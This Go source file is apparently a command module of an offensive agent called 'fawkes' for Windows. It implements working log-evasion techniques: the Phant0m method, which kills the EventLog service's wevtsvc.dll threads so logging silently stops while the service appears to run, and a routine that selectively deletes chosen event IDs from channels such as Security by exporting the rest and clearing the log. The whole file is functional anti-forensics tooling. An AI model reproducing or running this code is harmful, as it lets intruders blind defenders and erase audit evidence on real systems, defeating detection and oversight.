//go:build windows

package commands

import (
	"fmt"
	"runtime"
	"strings"
	"unsafe"

	"golang.org/x/sys/windows"
	"golang.org/x/sys/windows/svc/mgr"

	"fawkes/pkg/structs"
)

var (
	ntdllPhantom                 = windows.NewLazySystemDLL("ntdll.dll")
	procNtQueryInformationThread = ntdllPhantom.NewProc("NtQueryInformationThread")
	procK32GetModuleBaseNameW    = kernel32DLL.NewProc("K32GetModuleBaseNameW")
	procK32EnumProcessModulesEx  = kernel32DLL.NewProc("K32EnumProcessModulesEx")
	procK32GetModuleInformation  = kernel32DLL.NewProc("K32GetModuleInformation")
)

const (
	threadQuerySetWin32StartAddress = 9
	threadTerminate                 = 0x0001
	processQueryInformation         = 0x0400
	processVmRead                   = 0x0010
	listModulesAll                  = 0x03
)

type moduleInfo struct {
	BaseOfDll   uintptr
	SizeOfImage uint32
	EntryPoint  uintptr
}

func evtPhantom() structs.CommandResult {
	runtime.LockOSThread()
	defer runtime.UnlockOSThread()

	var sb strings.Builder
	sb.WriteString("[*] Phant0m — Kill EventLog Service Threads\n")
	sb.WriteString("[*] Technique: Enumerate svchost threads → NtQueryInformationThread → kill wevtsvc.dll threads\n\n")

	// Step 1: Find EventLog service PID
	scm, err := mgr.Connect()
	if err != nil {
		return errorf("Failed to connect to SCM: %v\nRequires administrator privileges.", err)
	}
	defer scm.Disconnect()

	svc, err := scm.OpenService("EventLog")
	if err != nil {
		return errorf("Failed to open EventLog service: %v", err)
	}
	defer svc.Close()

	status, err := svc.Query()
	if err != nil {
		return errorf("Failed to query EventLog service status: %v", err)
	}

	if status.State != windows.SERVICE_RUNNING {
		return errorf("EventLog service is not running (state=%d)", status.State)
	}

	pid := status.ProcessId
	sb.WriteString(fmt.Sprintf("[+] EventLog service PID: %d\n", pid))

	// Step 2: Find wevtsvc.dll module range in the svchost process
	hProcess, err := windows.OpenProcess(processQueryInformation|processVmRead, false, pid)
	if err != nil {
		return errorf("Failed to open EventLog process (PID %d): %v\nRequires SYSTEM or admin.", pid, err)
	}
	defer windows.CloseHandle(hProcess)

	wevtsvcBase, wevtsvcSize, err := findModuleRange(hProcess, "wevtsvc.dll")
	if err != nil {
		return errorf("Failed to find wevtsvc.dll in PID %d: %v", pid, err)
	}
	sb.WriteString(fmt.Sprintf("[+] wevtsvc.dll: base=0x%X size=0x%X\n", wevtsvcBase, wevtsvcSize))

	// Step 3: Enumerate threads in the EventLog svchost
	snapshot, _, snapErr := procCreateToolhelp32Snapshot.Call(uintptr(TH32CS_SNAPTHREAD), 0)
	if snapshot == uintptr(windows.InvalidHandle) {
		return errorf("CreateToolhelp32Snapshot failed: %v", snapErr)
	}
	defer windows.CloseHandle(windows.Handle(snapshot))

	var entry THREADENTRY32
	entry.Size = uint32(unsafe.Sizeof(entry))

	ret, _, err := procThread32First.Call(snapshot, uintptr(unsafe.Pointer(&entry)))
	if ret == 0 {
		return errorf("Thread32First failed: %v", err)
	}

	var killed, skipped, total int

	for {
		if entry.OwnerProcessID == pid {
			total++
			startAddr, queryErr := getThreadStartAddress(entry.ThreadID)
			if queryErr != nil {
				skipped++
				sb.WriteString(fmt.Sprintf("  [!] TID %d: failed to query start address: %v\n", entry.ThreadID, queryErr))
			} else if startAddr >= wevtsvcBase && startAddr < wevtsvcBase+uintptr(wevtsvcSize) {
				if killErr := terminateThreadByID(entry.ThreadID); killErr != nil {
					sb.WriteString(fmt.Sprintf("  [!] TID %d: kill failed: %v\n", entry.ThreadID, killErr))
				} else {
					killed++
					sb.WriteString(fmt.Sprintf("  [+] TID %d: killed (start=0x%X, in wevtsvc.dll)\n", entry.ThreadID, startAddr))
				}
			} else {
				skipped++
			}
		}

		ret, _, _ = procThread32Next.Call(snapshot, uintptr(unsafe.Pointer(&entry)))
		if ret == 0 {
			break
		}
	}

	sb.WriteString(fmt.Sprintf("\n[*] Results: %d threads in PID %d, %d killed (wevtsvc.dll), %d kept (svchost infrastructure)\n",
		total, pid, killed, skipped))

	if killed > 0 {
		sb.WriteString("[+] EventLog service appears running but event processing is stopped.\n")
		sb.WriteString("[*] Note: service restart (sc start EventLog) will resume logging.\n")
	} else {
		sb.WriteString("[!] No wevtsvc.dll threads found to kill. EventLog may already be stopped.\n")
	}

	return successResult(sb.String())
}

func getThreadStartAddress(threadID uint32) (uintptr, error) {
	hThread, _, err := procOpenThread.Call(
		THREAD_QUERY_INFORMATION,
		0,
		uintptr(threadID),
	)
	if hThread == 0 {
		return 0, fmt.Errorf("OpenThread: %v", err)
	}
	defer windows.CloseHandle(windows.Handle(hThread))

	var startAddr uintptr
	status, _, _ := procNtQueryInformationThread.Call(
		hThread,
		threadQuerySetWin32StartAddress,
		uintptr(unsafe.Pointer(&startAddr)),
		unsafe.Sizeof(startAddr),
		0,
	)
	if status != 0 {
		return 0, fmt.Errorf("NtQueryInformationThread returned 0x%X", status)
	}

	return startAddr, nil
}

func terminateThreadByID(threadID uint32) error {
	hThread, _, err := procOpenThread.Call(
		threadTerminate,
		0,
		uintptr(threadID),
	)
	if hThread == 0 {
		return fmt.Errorf("OpenThread: %v", err)
	}
	defer windows.CloseHandle(windows.Handle(hThread))

	ret, _, err := procTerminateThread.Call(hThread, 0)
	if ret == 0 {
		return fmt.Errorf("TerminateThread: %v", err)
	}

	return nil
}

func findModuleRange(hProcess windows.Handle, targetDLL string) (uintptr, uint32, error) {
	var modules [1024]windows.Handle
	var needed uint32

	ret, _, err := procK32EnumProcessModulesEx.Call(
		uintptr(hProcess),
		uintptr(unsafe.Pointer(&modules[0])),
		uintptr(len(modules)*int(unsafe.Sizeof(modules[0]))),
		uintptr(unsafe.Pointer(&needed)),
		listModulesAll,
	)
	if ret == 0 {
		return 0, 0, fmt.Errorf("K32EnumProcessModulesEx: %v", err)
	}

	count := needed / uint32(unsafe.Sizeof(modules[0]))
	nameBuf := make([]uint16, 260)

	for i := uint32(0); i < count && i < uint32(len(modules)); i++ {
		ret, _, _ := procK32GetModuleBaseNameW.Call(
			uintptr(hProcess),
			uintptr(modules[i]),
			uintptr(unsafe.Pointer(&nameBuf[0])),
			uintptr(len(nameBuf)),
		)
		if ret == 0 {
			continue
		}
		name := windows.UTF16ToString(nameBuf[:ret])
		if strings.EqualFold(name, targetDLL) {
			var mi moduleInfo
			ret2, _, err2 := procK32GetModuleInformation.Call(
				uintptr(hProcess),
				uintptr(modules[i]),
				uintptr(unsafe.Pointer(&mi)),
				unsafe.Sizeof(mi),
			)
			if ret2 == 0 {
				return 0, 0, fmt.Errorf("K32GetModuleInformation: %v", err2)
			}
			return mi.BaseOfDll, mi.SizeOfImage, nil
		}
	}

	return 0, 0, fmt.Errorf("%s not found in process modules", targetDLL)
}

func evtDeleteEvents(channel string, eventID int, filter string) structs.CommandResult {
	if channel == "" {
		return errorResult("Channel is required for delete-events action (e.g., Security, System)")
	}

	runtime.LockOSThread()
	defer runtime.UnlockOSThread()

	enableSecurityPrivilege()
	enableThreadSecurityPrivilege()

	var sb strings.Builder
	sb.WriteString(fmt.Sprintf("[*] Selective Event Deletion from '%s'\n", channel))

	countBefore := evtGetRecordCount(channel)
	sb.WriteString(fmt.Sprintf("[*] Current record count: %d\n", countBefore))

	// Build XPath to KEEP (exclude target events)
	var keepXPath string
	if eventID > 0 && filter != "" {
		keepXPath = fmt.Sprintf("*[System[EventID!=%d] or (%s)]", eventID, filter)
	} else if eventID > 0 {
		keepXPath = fmt.Sprintf("*[System[EventID!=%d]]", eventID)
	} else if filter != "" {
		keepXPath = fmt.Sprintf("*[System[not(%s)]]", filter)
	} else {
		return errorResult("Specify event_id and/or filter to identify events to delete")
	}

	sb.WriteString(fmt.Sprintf("[*] Keep filter: %s\n", keepXPath))

	// Count events to be deleted
	deleteXPath := buildDeleteXPath(eventID, filter)
	deleteCount := countEventsMatching(channel, deleteXPath)
	sb.WriteString(fmt.Sprintf("[*] Events matching deletion criteria: %d\n", deleteCount))

	if deleteCount == 0 {
		sb.WriteString("[*] No events match the deletion criteria. No changes made.\n")
		return successResult(sb.String())
	}

	// Export events to keep to a temp file
	tempPath := fmt.Sprintf("C:\\Windows\\Temp\\evt_%s_backup.evtx", channel)
	tempPathPtr, _ := windows.UTF16PtrFromString(tempPath)
	channelPtr, _ := windows.UTF16PtrFromString(channel)
	keepXPathPtr, _ := windows.UTF16PtrFromString(keepXPath)

	procEvtExportLog := wevtapi.NewProc("EvtExportLog")
	ret, _, err := procEvtExportLog.Call(
		0,
		uintptr(unsafe.Pointer(channelPtr)),
		uintptr(unsafe.Pointer(keepXPathPtr)),
		uintptr(unsafe.Pointer(tempPathPtr)),
		1, // EvtExportLogChannelPath
	)
	if ret == 0 {
		return errorf("EvtExportLog failed: %v\nXPath: %s", err, keepXPath)
	}
	sb.WriteString(fmt.Sprintf("[+] Exported events to keep → %s\n", tempPath))

	// Clear the original log
	clearRet, _, clearErr := procEvtClearLog.Call(
		0,
		uintptr(unsafe.Pointer(channelPtr)),
		0,
		0,
	)
	if clearRet == 0 {
		sb.WriteString(fmt.Sprintf("[!] EvtClearLog failed: %v\n", clearErr))
		sb.WriteString("[!] Backup file preserved. Manual restore: wevtutil im " + tempPath + "\n")
		return errorResult(sb.String())
	}
	sb.WriteString("[+] Original log cleared\n")

	countAfterClear := evtGetRecordCount(channel)
	sb.WriteString(fmt.Sprintf("[*] Records after clear: %d (should be 1 — the 1102 clear event)\n", countAfterClear))
	sb.WriteString(fmt.Sprintf("[+] Deleted ~%d events from '%s'\n", deleteCount, channel))
	sb.WriteString(fmt.Sprintf("[*] Backup of kept events: %s\n", tempPath))
	sb.WriteString("[*] To restore kept events: wevtutil im \"" + tempPath + "\"\n")
	sb.WriteString("[!] Note: Event ID 1102 (log cleared) was generated in Security.\n")

	return successResult(sb.String())
}

func buildDeleteXPath(eventID int, filter string) string {
	if eventID > 0 {
		return fmt.Sprintf("*[System[EventID=%d]]", eventID)
	}
	return fmt.Sprintf("*[System[%s]]", filter)
}

func countEventsMatching(channel, xpath string) uint64 {
	channelPtr, _ := windows.UTF16PtrFromString(channel)
	xpathPtr, _ := windows.UTF16PtrFromString(xpath)

	queryHandle, _, _ := procEvtQuery.Call(
		0,
		uintptr(unsafe.Pointer(channelPtr)),
		uintptr(unsafe.Pointer(xpathPtr)),
		evtQueryChannelPath,
	)
	if queryHandle == 0 {
		return 0
	}
	defer procEvtClose.Call(queryHandle)

	var count uint64
	events := make([]uintptr, 100)
	for {
		var returned uint32
		ret, _, _ := procEvtNext.Call(
			queryHandle,
			uintptr(len(events)),
			uintptr(unsafe.Pointer(&events[0])),
			1000,
			0,
			uintptr(unsafe.Pointer(&returned)),
		)
		if ret == 0 {
			break
		}
		for i := uint32(0); i < returned; i++ {
			procEvtClose.Call(events[i])
		}
		count += uint64(returned)
	}
	return count
}
